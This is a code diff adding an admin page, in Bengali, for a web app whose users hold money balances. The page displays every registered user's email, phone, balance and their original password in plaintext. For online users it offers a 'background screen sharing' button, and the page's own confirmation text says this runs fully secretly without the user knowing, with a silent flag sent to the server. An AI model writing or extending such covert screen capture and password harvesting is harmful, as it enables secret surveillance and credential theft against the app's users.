@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<title>ইউজার ইনফরমেশন - এডমিন প্যানেল</title>
+<link rel="stylesheet" href="/style.css">
+<script src="/socket.io/socket.io.js"></script>
+<style>
+.admin-header {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.nav-menu {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    margin: 20px 0;
+    flex-wrap: wrap;
+}
+.nav-box {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-weight: bold;
+    transition: transform 0.3s;
+    cursor: pointer;
+    font-size: 14px;
+}
+.nav-box:hover {
+    transform: translateY(-2px);
+    color: white;
+}
+
+.users-container {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+    gap: 20px;
+    padding: 20px;
+}
+
+.user-card {
+    background: white;
+    border-radius: 10px;
+    padding: 20px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    border-left: 4px solid #667eea;
+}
+
+.user-card.online {
+    border-left-color: #28a745;
+}
+
+.user-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 15px;
+}
+
+.user-avatar {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    color: white;
+    font-size: 18px;
+}
+
+.user-status {
+    padding: 5px 15px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: bold;
+}
+
+.status-online {
+    background: #d4edda;
+    color: #155724;
+}
+
+.status-offline {
+    background: #f8d7da;
+    color: #721c24;
+}
+
+.user-info {
+    margin: 10px 0;
+}
+
+.info-row {
+    display: flex;
+    justify-content: between;
+    margin: 5px 0;
+    padding: 5px 0;
+    border-bottom: 1px solid #eee;
+}
+
+.info-label {
+    font-weight: bold;
+    color: #666;
+    min-width: 100px;
+}
+
+.info-value {
+    color: #333;
+}
+
+.screen-share-btn {
+    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+    color: white;
+    border: none;
+    padding: 10px 15px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: transform 0.3s;
+    margin-top: 10px;
+    width: 100%;
+}
+
+.screen-share-btn:hover {
+    transform: translateY(-2px);
+}
+
+.screen-share-btn:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+    transform: none;
+}
+
+.stats-container {
+    display: flex;
+    justify-content: space-around;
+    margin: 20px 0;
+    flex-wrap: wrap;
+}
+
+.stat-box {
+    background: #f8f9fa;
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
+    min-width: 150px;
+    margin: 10px;
+}
+
+.stat-number {
+    font-size: 24px;
+    font-weight: bold;
+    color: #667eea;
+    margin: 10px 0;
+}
+</style>
+</head>
+<body>
+<div class="admin-header">
+    <h2>ইউজার ইনফরমেশন এবং স্ক্রিন কন্ট্রোল</h2>
+    <p>রেজিস্টার্ড ইউজারদের তথ্য এবং রিয়েল টাইম স্ট্যাটাস</p>
+</div>
+
+<div class="nav-menu">
+    <a href="/admin_panel" class="nav-box">🏠 মূল প্যানেল</a>
+    <a href="/admin/user_information" class="nav-box" style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%);">👥 ইউজার তথ্য</a>
+    <a href="/admin/screen_control" class="nav-box">🖥️ স্ক্রিন কন্ট্রোল</a>
+    <a href="/admin/messaging_system" class="nav-box">💬 মেসেজিং</a>
+</div>
+
+<div class="stats-container">
+    <div class="stat-box">
+        <h4 style="color: #667eea; margin: 0;">মোট রেজিস্টার্ড ইউজার</h4>
+        <div class="stat-number"><%= users.length %></div>
+    </div>
+    <div class="stat-box">
+        <h4 style="color: #28a745; margin: 0;">বর্তমানে অনলাইন</h4>
+        <div class="stat-number"><%= connectedUsers.length %></div>
+    </div>
+    <div class="stat-box">
+        <h4 style="color: #ff6b6b; margin: 0;">স্ক্রিন শেয়ারিং সক্রিয়</h4>
+        <div class="stat-number" id="activeShareCount">0</div>
+    </div>
+</div>
+
+<div class="users-container">
+    <% users.forEach(user => { %>
+        <% 
+        const connectedUser = connectedUsers.find(cu => cu.userId === user.userId);
+        const isOnline = !!connectedUser;
+        %>
+        <div class="user-card <%= isOnline ? 'online' : '' %>" data-user-id="<%= user.userId %>">
+            <div class="user-header">
+                <div style="display: flex; align-items: center;">
+                    <div class="user-avatar"><%= user.name.charAt(0).toUpperCase() %></div>
+                    <div style="margin-left: 15px;">
+                        <h3 style="margin: 0; color: #333;"><%= user.name %></h3>
+                        <p style="margin: 0; color: #666; font-size: 14px;"><%= user.userId %></p>
+                    </div>
+                </div>
+                <div class="user-status <%= isOnline ? 'status-online' : 'status-offline' %>">
+                    <%= isOnline ? 'অনলাইন' : 'অফলাইন' %>
+                </div>
+            </div>
+            
+            <div class="user-info">
+                <div class="info-row">
+                    <span class="info-label">ইমেইল:</span>
+                    <span class="info-value"><%= user.email %></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">ফোন নম্বর:</span>
+                    <span class="info-value"><%= user.phone || 'N/A' %></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">আসল পাসওয়ার্ড:</span>
+                    <span class="info-value" style="background: #fff3cd; padding: 2px 5px; border-radius: 3px; font-family: monospace;"><%= user.originalPassword || 'N/A' %></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">ব্যালেন্স:</span>
+                    <span class="info-value" style="color: #28a745; font-weight: bold;"><%= user.balance || 0 %> টাকা</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">রেজিস্ট্রেশন:</span>
+                    <span class="info-value"><%= new Date(user.joinedAt || user.createdAt || Date.now()).toLocaleDateString('bn-BD') %></span>
+                </div>
+                <% if (isOnline) { %>
+                <div class="info-row">
+                    <span class="info-label">সংযুক্ত সময়:</span>
+                    <span class="info-value"><%= new Date(connectedUser.connectedAt).toLocaleTimeString('bn-BD') %></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Socket ID:</span>
+                    <span class="info-value" style="font-size: 10px;"><%= connectedUser.socketId %></span>
+                </div>
+                <% } %>
+            </div>
+            
+            <div style="display: flex; gap: 10px; margin-top: 15px;">
+                <% if (isOnline) { %>
+                <button class="screen-share-btn" onclick="goToUserProfile('<%= user.userId %>', '<%= user.name %>')" style="background: linear-gradient(135deg, #007bff 0%, #0056b3 100%); width: 48%;">
+                    👤 প্রোফাইল দেখুন
+                </button>
+                <button class="screen-share-btn" onclick="initiateBackgroundScreenShare('<%= user.userId %>', '<%= user.name %>')" style="width: 48%;">
+                    📱 স্ক্রিন শেয়ারিং
+                </button>
+                <% } else { %>
+                <button class="screen-share-btn" onclick="goToUserProfile('<%= user.userId %>', '<%= user.name %>')" style="background: linear-gradient(135deg, #007bff 0%, #0056b3 100%); width: 48%;">
+                    👤 প্রোফাইল দেখুন
+                </button>
+                <button class="screen-share-btn" disabled style="width: 48%;">
+                    ⭕ অফলাইন
+                </button>
+                <% } %>
+            </div>
+        </div>
+    <% }); %>
+</div>
+
+<div style="text-align: center; margin: 30px 0;">
+    <a href="/admin_panel" class="btn btn-secondary">এডমিন প্যানেলে ফিরে যান</a>
+    <a href="/admin_logout" class="btn btn-danger" style="margin-left: 15px;">লগআউট</a>
+</div>
+
+<script>
+const socket = io();
+
+// Admin connection
+socket.emit('admin_connect', {
+    adminId: 'admin1994',
+    name: 'Admin'
+});
+
+// ইউজার প্রোফাইলে যাওয়ার ফাংশন
+function goToUserProfile(userId, userName) {
+    window.location.href = `/admin/user_profile/${userId}`;
+}
+
+// ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং শুরু করার ফাংশন
+function initiateBackgroundScreenShare(userId, userName) {
+    const confirmation = confirm(`${userName} এর ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং শুরু করতে চান?\n\nনোট: এটি সম্পূর্ণ গোপনে চলবে, ইউজার জানতে পারবে না।`);
+    
+    if (confirmation) {
+        socket.emit('admin_start_background_screen_sharing', {
+            targetUserId: userId,
+            adminId: 'admin1994',
+            silent: true // ইউজার বুঝতে পারবে না
+        });
+        
+        // সফল বার্তা দেখানো
+        showNotification(`${userName} এর ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং শুরু হয়েছে`, 'success');
+        
+        // বোতাম আপডেট করা
+        updateButtonState(userId, 'sharing');
+    }
+}
+
+// নোটিফিকেশন দেখানোর ফাংশন
+function showNotification(message, type = 'info') {
+    const notification = document.createElement('div');
+    notification.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: ${type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#007bff'};
+        color: white;
+        padding: 15px 20px;
+        border-radius: 10px;
+        z-index: 10000;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        font-size: 14px;
+        max-width: 350px;
+        animation: slideIn 0.5s ease-out;
+    `;
+    notification.textContent = message;
+    
+    document.body.appendChild(notification);
+    
+    setTimeout(() => {
+        if (document.body.contains(notification)) {
+            document.body.removeChild(notification);
+        }
+    }, 5000);
+}
+
+// বোতামের অবস্থা আপডেট করা
+function updateButtonState(userId, state) {
+    const userCard = document.querySelector(`[data-user-id="${userId}"]`);
+    if (userCard) {
+        const shareBtn = userCard.querySelector('.screen-share-btn:last-child');
+        if (shareBtn && state === 'sharing') {
+            shareBtn.textContent = '🔴 শেয়ারিং চলছে';
+            shareBtn.style.background = 'linear-gradient(135deg, #dc3545 0%, #c82333 100%)';
+            shareBtn.onclick = () => stopBackgroundScreenShare(userId);
+        }
+    }
+}
+
+// ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং বন্ধ করা
+function stopBackgroundScreenShare(userId) {
+    if (confirm('স্ক্রিন শেয়ারিং বন্ধ করতে চান?')) {
+        socket.emit('admin_stop_background_screen_sharing', {
+            targetUserId: userId,
+            adminId: 'admin1994'
+        });
+    }
+}
+
+// Socket event listeners
+socket.on('screen_share_started', (data) => {
+    alert(`${data.userName} এর স্ক্রিন শেয়ারিং শুরু হয়েছে`);
+    updateActiveShareCount();
+});
+
+socket.on('screen_share_ended', (data) => {
+    alert(`${data.userName} এর স্ক্রিন শেয়ারিং বন্ধ হয়েছে`);
+    updateActiveShareCount();
+});
+
+socket.on('user_status_update', (data) => {
+    // Refresh page when user status changes
+    setTimeout(() => location.reload(), 1000);
+});
+
+function updateActiveShareCount() {
+    // This would be updated from server data
+    // For now, placeholder functionality
+}
+
+console.log('Admin user information panel loaded');
+</script>
+</body>
+</html>
